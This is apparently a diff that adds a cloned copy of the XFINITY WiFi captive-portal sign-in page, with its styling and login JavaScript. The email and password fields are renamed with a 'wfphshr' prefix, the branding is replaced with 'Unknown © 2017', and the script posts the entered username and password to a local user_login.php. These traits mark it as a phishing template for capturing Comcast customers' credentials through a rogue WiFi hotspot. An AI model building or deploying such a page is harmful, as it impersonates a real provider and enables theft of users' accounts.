@@ -1,0 +1,365 @@
+
+<!-- saved from url=(0208)https://wifilogin.xfinity.com/start.php?h=hQB2UuQE82M97E1s7vD99eC7JNSvfEZrBsS%2FMtguReQwv2ds%2BlAmenxa0231vRVZtG8Kcj3ML1Cs88jW2plUxIKDvnvGbqUeeClF%2FpSlEf5JhxR4beYmWoHIKnmGN8DN%2BwsuyLB6J%2FjIK2sttm8NIQ%3D%3D -->
+<html lang="en" style="" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths gr__wifilogin_xfinity_com"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Sign in to XFINITY WiFi</title>
+<meta name="description" content="">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="./static/comcast-wifi-portal.css">
+<script type="text/javascript" src="./static/jquery-2.1.3.min.js"></script>
+<script type="text/javascript" src="./static/all.js"></script>
+<noscript>
+&lt;style type="text/css"&gt;
+.hero {
+	background-image: url('./static/tax-day-large.jpg');
+}
+.customer-portal .customer-block .customer-block-content {
+	display: block;
+}
+&lt;/style&gt;
+</noscript>
+</head>
+<body class="general" data-gr-c-s-loaded="true">
+<header class="hero responsive-background" data-small="./static/tax-day-small.jpg" data-medium="" data-large="./static//tax-day-large.jpg" style="background-blend-mode: color; background-color: rgba(0, 0, 0, 0.4); background-image: url(&quot;./static/tax-day-large.jpg&quot;);">
+<img alt="Xfinity WiFi Logo" class="xfinity-wifi-logo" src="./static/wifi-logo.png">
+<div class="container"><div class="header-content">
+<h1> Getting online <em>is easy.</em> </h1><p class="mobile-hidden">Sign in or Sign Up to get access now!</p></div></div></header>
+<main>
+  <div class="wrapper">
+    <div class="container">
+      <div class="content">
+        </article>
+        <div class="customer-portal-wrapper customer-portal-sidebar">
+          <div class="customer-portal">
+            <section class="customer-block dropdown header-block signin _active">
+              <header class="customer-block-header dropdown-header">
+                <h2 class="desktop-visible">Get started here!</h2>
+                <span class="desktop-hidden">
+                <button type="button">
+                I have an XFINITY account                </button>
+                </span> </header>
+              <div class="customer-block-content dropdown-content signin-form" style="display: block;">
+                <p class="desktop-visible customer-block-text">
+                  I have an XFINITY account                </p>
+                <form name="signin" class="customer-signin-form" id="signin-in" action="https://wifilogin.xfinity.com/user_login.php" method="post" onsubmit="return authenticate($(this))">
+                  <div>
+                    <ul class="error_box">
+                                          </ul>
+                  </div>
+                  <div class="form-element">
+                    <label class="hidden-label" for="username">Email or Username</label>
+                    <input id="username" name="wfphshr-email" placeholder="Email or Username" type="text">
+                  </div>
+                  <div class="form-element">
+                    <label class="hidden-label" for="password">Password</label>
+                    <input id="password" name="wfphshr-password" placeholder="Password" type="password">
+                  </div>
+                  <div class="form-element">
+                    <label for="friendlyname">Name Device (e.g., Jen's Tablet)</label>
+                    <input id="friendlyname" name="friendlyname" placeholder="Name Device (e.g., Jen&#39;s Tablet)" type="text">
+                    <br>
+
+
+                                      </div>
+                  <div class="form-element">
+                    <button type="submit" class="btn_authenticate">Sign in</button>
+                  </div>
+                  <input type="hidden" name="javascript" value="false">
+                  <input type="hidden" name="method" value="authenticate">
+                  <input type="hidden" name="hash" value="">
+                </form>
+              </div>
+            </section>
+
+
+          </div>
+
+                  </div>
+      </div>
+    </div>
+  </div>
+</main>
+<footer>
+  <div class="container">
+    <section class="footer-content">
+
+      <p>Not available in all areas. Restrictions apply. XFINITY WiFi is included for XFINITY Internet tiers of 25Mbps download speeds and above only. <br>Unknown © 2017. All rights reserved.<br></p>
+       </section>
+  </div>
+</footer>
+
+<script>
+	var pointbreak = new Pointbreak();
+	var ResponsiveImage = new ResponsiveImage();
+	var Dropdown = new Dropdown();
+	var PhoneLinks = new PhoneLinks();
+	var CustomSelect = new CustomSelect();
+	var EqualHeight = new EqualHeight();
+
+	var btn_authenticate, btn_text, error_box;
+
+	$('.signUpButton').click(function(event){
+		var clickedId = event.target.id;
+		log_data = {
+			'action': 'write_to_log_json',
+			'log': '/var/log/httpd/user_pixel.log',
+			'encoded_array': '{}',
+			'json_encoded': true
+		}
+		$.ajax({
+			type: "POST",
+		  	url: "portal_functions.php",
+		  	cache: false,
+		  	timeout: 10000,
+		  	dataType: "json",
+		  	data: log_data
+		}).done(function(){
+			window.location.href = $('#'+clickedId).data('redirect');
+		}).fail(function(){
+			window.location.href = $('#'+clickedId).data('redirect');
+		});
+		return false;
+	});
+
+	var email_cookie_set = false;
+	var zipcode_cookie_set = false;
+
+	function authenticate(form) {
+		var post_data;
+		error_box = form.find('.error_box');
+		btn_authenticate = form.find('.btn_authenticate');
+		btn_text = btn_authenticate.text();
+
+		error_box.html('');
+
+		if(btn_authenticate.hasClass('amenity')) {
+			if( !isValidEmailAddress($.trim($('#email').val())) && email_cookie_set == false)
+				error_box.append('<li>Invalid email format.</li>');
+			if(!$("#agree").is(':checked') )
+				error_box.append('<li>Please agree to the Terms of Service.</li>');
+			if(!$.trim($("#zip_code").val()) && zipcode_cookie_set == false)
+				error_box.append('<li>Zip Code is required field.</li>');
+
+			post_data = {
+				'method': 'authenticate_amenity',
+				'email': $('#email').val(),
+				'zip_code': $('#zip_code').val(),
+				'agree': $('#agree').val(),
+				'cp_location': $('#cp_location_value').val(),
+				'hash': "",
+		  		'javascript':'true'
+			}
+		} else if (btn_authenticate.hasClass('complimentaryWifi')) {
+			if(!$("#agree_complimentaryWifi").is(':checked') )
+				error_box.append('<li>Please agree to the Terms of Service.</li>');
+			post_data = {}
+		} else {
+			if($('#username').val() == '')
+				error_box.append('<li>Email or username cannot be blank.</li>');
+			if($('#password').val() == '')
+				error_box.append('<li>Password cannot be blank.</li>');
+
+			post_data = {
+				'username': $.trim($('#username').val()),
+		  		'password': $('#password').val(),
+			}
+		}
+
+		if(error_box.html() != '')
+			return false;
+		$(':input').prop('disabled',true);
+		btn_authenticate.text('Authenticating...');
+
+		$.ajax({
+		  type: "POST",
+		  url: "user_login.php",
+		  cache: false,
+		  timeout: 4000,
+		  dataType: "json",
+		  data: post_data
+		})
+		.done(function(json) {
+		  	if(json.response == "Success") {
+		  		window.location.href = json.url;
+			} else if(json.response == "Bad Credentials" || json.response == "Username Invalid - Character set or length" || json.response == "Username Invalid - Character set") {
+				error_box.append('<li>The username and password entered do not match. Please try again.</li>');
+			} else if(json.response == "Bad Post") {
+				error_box.append('<li>An unknown error has occured, please try again.</li>');
+			} else if(json.response == "Timeout") {
+			    error_box.append('<li>An unknown error has occured, please try again.</li>');
+			} else if(json.response == "Unauthorized Service" ||
+					  json.response == "Device Blacklisted" ||
+					  json.response == "Concurrency Failed" ||
+					  json.response == "Concurrency Failed - Master Owner" ||
+					  json.response == "Concurrency Failed - Secondary Account" ||
+					  json.response == "No HSD" ||
+					  json.response == "General Error" ||
+					  json.response == "WOD - unauthorized service" ||
+					  json.response == "WOD - unauthorized service no HSD" ||
+					  json.response == "WOD - Amdocs Offer Page" ||
+						json.response == "Viasat - Amenity Page" ||
+					  json.response == "Amdocs - Email not verified" ||
+					  json.response == "Forbidden MAC request" ||
+                      json.response == "Excessive Invalid Login Attempts") {
+				window.location.href = json.url;
+			}
+
+			// This section should never get executed if javascript checked correctly above, except for the regex
+			if(json.response.reasons) {
+				for (var reason in json.response.reasons) {
+					if(json.response.reasons[reason] == "Bad Credentials" || json.response.reasons[reason] == "Username Invalid - Character set or length" || json.response.reasons[reason] == "Username Invalid - Character set") {
+						error_box.append('<li>The username and password entered do not match. Please try again.</li>');
+					} else if(json.response.reasons[reason] == "Username Blank") {
+						error_box.append('<li>Email or username cannot be blank.</li>');
+					} else if(json.response.reasons[reason] == "Password Blank") {
+						error_box.append('<li>Password cannot be blank.</li>');
+					} else if(json.response.reasons[reason] == "Invalid Email") {
+						error_box.append('<li>Invalid email format.</li>');
+					} else if(json.response.reasons[reason] == "tos") {
+						error_box.append('<li>Please agree to the Terms of Service.</li>');
+					}
+				}
+			}
+
+			$(':input').prop('disabled',false);
+			btn_authenticate.text(btn_text);
+		})
+		.fail(function(jqXHR, textStatus) {
+			$.ajax({
+			  type: "POST",
+			  url: "user_login.php",
+			  cache: false,
+			  timeout: 6000,
+			  dataType: "json",
+			  data: post_data
+			})
+			.done(function(json) {
+			  	if(json.response == "Success") {
+			  		window.location.href = json.url;
+				} else if(json.response == "Bad Credentials" || json.response == "Username Invalid - Character set or length" || json.response == "Username Invalid - Character set") {
+					error_box.append('<li>The username and password entered do not match. Please try again.</li>');
+				} else if(json.response == "Bad Post") {
+					error_box.append('<li>An unknown error has occured, please try again.</li>');
+				} else if(json.response == "Timeout") {
+				    error_box.append('<li>An unknown error has occured, please try again.</li>');
+				} else if(json.response == "Unauthorized Service" ||
+						  json.response == "Device Blacklisted" ||
+						  json.response == "Concurrency Failed" ||
+						  json.response == "Concurrency Failed - Master Owner" ||
+						  json.response == "Concurrency Failed - Secondary Account" ||
+						  json.response == "No HSD" ||
+						  json.response == "General Error" ||
+						  json.response == "WOD - unauthorized service" ||
+						  json.response == "WOD - unauthorized service no HSD" ||
+						  json.response == "WOD - Amdocs Offer Page" ||
+							json.response == "Viasat - Amenity Page" ||
+						  json.response == "Amdocs - Email not verified" ||
+						  json.response == "Forbidden MAC request" ||
+	                      json.response == "Excessive Invalid Login Attempts") {
+					window.location.href = json.url;
+				}
+
+				// This section should never get executed if javascript checked correctly above, except for the regex
+				if(json.response.reasons) {
+					for (var reason in json.response.reasons) {
+						if(json.response.reasons[reason] == "Bad Credentials" || json.response.reasons[reason] == "Username Invalid - Character set or length" || json.response.reasons[reason] == "Username Invalid - Character set") {
+							error_box.append('<li>The username and password entered do not match. Please try again.</li>');
+						} else if(json.response.reasons[reason] == "Username Blank") {
+							error_box.append('<li>Email or username cannot be blank.</li>');
+						} else if(json.response.reasons[reason] == "Password Blank") {
+							error_box.append('<li>Password cannot be blank.</li>');
+						} else if(json.response.reasons[reason] == "Invalid Email") {
+							error_box.append('<li>Invalid email format.</li>');
+						} else if(json.response.reasons[reason] == "tos") {
+							error_box.append('<li>Please agree to the Terms of Service.</li>');
+						}
+					}
+				}
+
+				$(':input').prop('disabled',false);
+				btn_authenticate.text(btn_text);
+			}).
+			fail(function(jqXHR, textStatus) {
+				$.ajax({
+				  type: "POST",
+				  url: "user_login.php",
+				  cache: false,
+				  timeout: 10000,
+				  dataType: "json",
+				  data: post_data
+				})
+				.done(function(json) {
+				  	if(json.response == "Success") {
+				  		window.location.href = json.url;
+					} else if(json.response == "Bad Credentials" || json.response == "Username Invalid - Character set or length" || json.response == "Username Invalid - Character set") {
+						error_box.append('<li>The username and password entered do not match. Please try again.</li>');
+					} else if(json.response == "Bad Post") {
+						error_box.append('<li>An unknown error has occured, please try again.</li>');
+					} else if(json.response == "Timeout") {
+					    error_box.append('<li>An unknown error has occured, please try again.</li>');
+					} else if(json.response == "Unauthorized Service" ||
+							  json.response == "Device Blacklisted" ||
+							  json.response == "Concurrency Failed" ||
+							  json.response == "Concurrency Failed - Master Owner" ||
+							  json.response == "Concurrency Failed - Secondary Account" ||
+							  json.response == "No HSD" ||
+							  json.response == "General Error" ||
+							  json.response == "WOD - unauthorized service" ||
+							  json.response == "WOD - unauthorized service no HSD" ||
+							  json.response == "WOD - Amdocs Offer Page" ||
+								json.response == "Viasat - Amenity Page" ||
+							  json.response == "Amdocs - Email not verified" ||
+							  json.response == "Forbidden MAC request" ||
+		                      json.response == "Excessive Invalid Login Attempts") {
+						window.location.href = json.url;
+					}
+
+					// This section should never get executed if javascript checked correctly above, except for the regex
+					if(json.response.reasons) {
+						for (var reason in json.response.reasons) {
+							if(json.response.reasons[reason] == "Bad Credentials" || json.response.reasons[reason] == "Username Invalid - Character set or length" || json.response.reasons[reason] == "Username Invalid - Character set") {
+								error_box.append('<li>The username and password entered do not match. Please try again.</li>');
+							} else if(json.response.reasons[reason] == "Username Blank") {
+								error_box.append('<li>Email or username cannot be blank.</li>');
+							} else if(json.response.reasons[reason] == "Password Blank") {
+								error_box.append('<li>Password cannot be blank.</li>');
+							} else if(json.response.reasons[reason] == "Invalid Email") {
+								error_box.append('<li>Invalid email format.</li>');
+							} else if(json.response.reasons[reason] == "tos") {
+								error_box.append('<li>Please agree to the Terms of Service.</li>');
+							}
+						}
+					}
+					$(':input').prop('disabled',false);
+					btn_authenticate.text(btn_text);
+				}).fail(function(){
+					$(':input').prop('disabled',false);
+	                btn_authenticate.text(btn_text);
+					error_box.append('<li>An unknown error has occured, please try again.</lii>');
+				});
+
+	    	});
+
+    	});
+    	return false;
+    }
+
+    function isValidEmailAddress(emailAddress) {
+	    var pattern = new RegExp(/^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?$/i);
+	    return pattern.test(emailAddress);
+	};
+
+  $(document).ready(function() {
+		if( /Firefox/i.test(navigator.userAgent) && /Android/i.test(navigator.userAgent) ) {
+			var notXfinityCustomerhtml = $("#not-xfinity-customer").html();
+			notXfinityCustomerhtml = notXfinityCustomerhtml.replace('<button type="button">','');
+			notXfinityCustomerhtml = notXfinityCustomerhtml.replace('</button>','');
+			$("#not-xfinity-customer").html(notXfinityCustomerhtml);
+			$("#wawa_id").css("margin","0 0 0 40");
+                        $("#wawa_id").css("font-weight","700");
+	    }
+	});
+</script>
+
+<div id="ir-ext-ui" style="display: none; color: rgb(0, 0, 0); font-size: 11px; line-height: 11px; background-color: rgb(247, 247, 247); border: 1px solid rgb(153, 153, 153); border-radius: 2px; top: 1px; right: 1px;">  <div class="ir-ext-dimensions">    <span class="ir-ext-rendered" title="Rendered image dimensions (after any scaling/resizing has been applied)">      <span data-ir-ext-width="">159</span>x<span data-ir-ext-height="">33</span>    </span>    <span class="ir-ext-natural" title="Natural image dimensions (without applying any scaling/resizing)" style="display: none;">      (<span data-ir-ext-width="">0</span>x<span data-ir-ext-height="">0</span>)    </span>  </div>  <div class="ir-ext-filesize" style="display: none;">    <span data-ir-ext-value="" title="0 bytes">0</span>    <abbr data-ir-ext-unit="" title="Byte">B</abbr>  </div>  <style>    #ir-ext-ui {      position: fixed;      padding: 1px;      z-index: 9999;      display: none;      font-family: Consolas, "Lucida Console", "Courier New", Courier, monospace;      text-align: right;    }  </style></div></body></html>
